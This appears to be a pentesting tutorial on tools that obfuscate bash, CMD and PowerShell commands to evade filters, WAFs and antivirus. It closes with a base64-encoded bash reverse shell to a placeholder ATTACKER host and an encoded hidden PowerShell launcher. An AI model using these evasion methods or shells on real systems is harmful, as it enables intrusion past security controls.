Hand-crafting obfuscated payloads is fine for one-off exploitation. For serious filter bypass or when you need to try many variations fast, these tools automate the process.

## Bashfuscator

Transforms bash commands into obfuscated equivalents using a mix of techniques: reverse, base64, case manipulation, char insertion. Multiple obfuscation layers.

**Install:**

```bash
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user
```

**Basic usage:**

```bash
# obfuscate a command
./bashfuscator -c 'whoami'

# aggressive (multiple layers)
./bashfuscator -c 'whoami' -s 1 -t 1
```

Output is wild — typically hundreds of characters even for `whoami`. But it works against most word-based blacklists.

## DOSfuscation

Windows equivalent — obfuscates CMD and PowerShell commands. Written in PowerShell.

**Install:**

```powershell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation
Import-Module ./Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
```

Interactive menu with increasingly aggressive obfuscation levels.

**Example output** for `calc.exe`:

```cmd
^c^A^lc^.^e^Xe
```

Or with heavy encoding:

```cmd
cmd /c "set x=calc&& cmd /c %x%.exe"
```

## Invoke-Obfuscation (PowerShell)

The classic for PowerShell obfuscation. Handles token, string, and AST-level transformations.

**Install:**

```powershell
git clone https://github.com/danielbohannon/Invoke-Obfuscation
Import-Module ./Invoke-Obfuscation.psd1
Invoke-Obfuscation
```

Interactive, multi-layered. Can chain:
- Token-level: variable name scrambling
- String-level: base64, reverse, character tricks
- AST-level: compound statements that produce the same result
- Launcher: wrap in PowerShell arguments that don't look like PowerShell

Output defeats most AV signatures and in-URL WAFs.

## Why Use These

Three real benefits over hand-crafted obfuscation:

1. **Speed** — generate a working payload in seconds, not minutes
2. **Variety** — same input produces different output each run, useful if the WAF learns
3. **Layering** — stack multiple obfuscation types that would be tedious manually

## When Not to Use Them

- When the filter is simple and one-layer obfuscation would work — a 500-character payload is overkill
- When input length is capped — tool output is always long
- When the app's parsing is weird (JSON escaping, double URL-encoding) — manual gives you control
- When you need to understand *why* a bypass works for the report — tools generate magic strings

## Methodology

1. Try hand-crafted obfuscation first (faster, more controllable)
2. If that fails and you have budget, switch to tools
3. Start with the lowest obfuscation level — higher levels get longer and may hit size limits
4. Generate 3-5 variants; try each; move to the next technique if all fail

## OffSec-Style One-Liner Reference

A few obfuscated reverse shell patterns that work in pentesting without needing the tools:

### Linux

```bash
# bash reverse shell, base64-encoded
bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUi80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}'
```

### Windows PowerShell

```powershell
powershell -nop -w hidden -enc <base64_utf16le>
```

Where the base64 is `$client = New-Object System.Net.Sockets.TCPClient(...)` etc., encoded as UTF-16LE.
